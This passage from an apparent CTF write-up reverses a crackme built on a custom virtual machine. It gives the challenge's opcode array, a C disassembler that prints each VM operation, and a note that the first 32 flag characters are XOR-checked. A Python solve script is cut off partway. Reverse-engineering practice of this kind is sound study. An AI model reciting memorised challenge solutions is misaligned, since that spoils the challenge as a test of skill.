class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDD</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4F</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, </span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, </span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0xB9</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0xC1</span>, <span class="number">0x24</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0xC7</span>, <span class="number">0xC1</span>, <span class="number">0x28</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2A</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, </span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC8</span>, <span class="number">0x99</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i] == <span class="number">0x71</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[6] -= 4\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;*table[6] = 0x%x\n&quot;</span>,opcode[i+<span class="number">1</span>]);</span><br><span class="line">      i += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] += table[2]\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x42</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] -= table[4];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x43</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] *= table[3];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] = table[5];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x38</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] ^= table[4];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] ^= table[5];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[5] = table[1];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xF7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;table[9] += table[1];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x44</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] /= table[5];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[2] = 0x%x\n&quot;</span>,*((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(&amp;opcode[i+<span class="number">2</span>])));</span><br><span class="line">      i += <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x77</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] ^= table[9];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x53</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;(sub_8048580)(*table[3]);\n&quot;</span>);</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x22</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] &gt;&gt;= table[2];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x23</span> )</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;table[1] &lt;&lt;= table[2];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[3] = *table[6];\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;*table[6] = 0;\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[6] += 4;\n&quot;</span>);</span><br><span class="line">      i += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x54</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;v6 = table[3];\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;*v6 = sub_8048520();\n&quot;</span>);</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x30</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] |= table[2];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i] == <span class="number">0x31</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] &amp;= table[2];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[3] = 0x%x\n&quot;</span>,opcode[i+<span class="number">1</span>]) ;</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] = 1877735783;\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[9] = table[1];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x33</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[4] = table[1]\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x34</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[2] = 0x%x;&quot;</span>,opcode[i+<span class="number">1</span>]);</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xFE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] = table[9];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0x11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;(sub_8048510)(&amp;unk_8049340, table[1])\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;if ( table[1] != 1877735783 )\nexit\n\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xA1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xB1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[9] = xor[0]\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xB2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[9] = xor[1];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xA4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;xor[*(table[8] + 1)] = table[1];\n&quot;</span>); </span><br><span class="line">      i += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;table[9] = xor[2];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i] == <span class="number">0xB4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[9] = xor[3];\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xC1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;table[1] = flag[%d];\n&quot;</span>,opcode[i+<span class="number">1</span>]);</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;dword_804B060 != table[1]\n\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xC8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;dword_804B064 != table[1]\n\n&quot;</span>);</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opcode[i]  == <span class="number">0xC2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;if ( %d != table[1] )\n\n&quot;</span>,opcode[i+<span class="number">1</span>]);</span><br><span class="line">      i+= <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面32个字符如下结构，就是一个异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">table[1] &#x3D; flag[0];</span><br><span class="line">table[9] &#x3D; xor[0]</span><br><span class="line">table[1] ^&#x3D; table[9];</span><br><span class="line">if ( 74 !&#x3D; table[1] )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#里面的数据都是从opcode提出来的。</span></span><br><span class="line">index=[<span class="number">0xb1</span>,<span class="number">0xb2</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0xb2</span>,<span class="number">0xb4</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb3</span>,<span class="number">0xb4</span>,<span class="number">0xb2</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb3</span>,<span class="number">0xb2</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb4</span>,<span class="number">0xb1</span>,<span class="number">0xb4</span>,<span class="number">0xb1</span>,<span class="number">0xb3</span>,<span class="number">0xb2</span>,<span class="number">0xb3</span>,<span 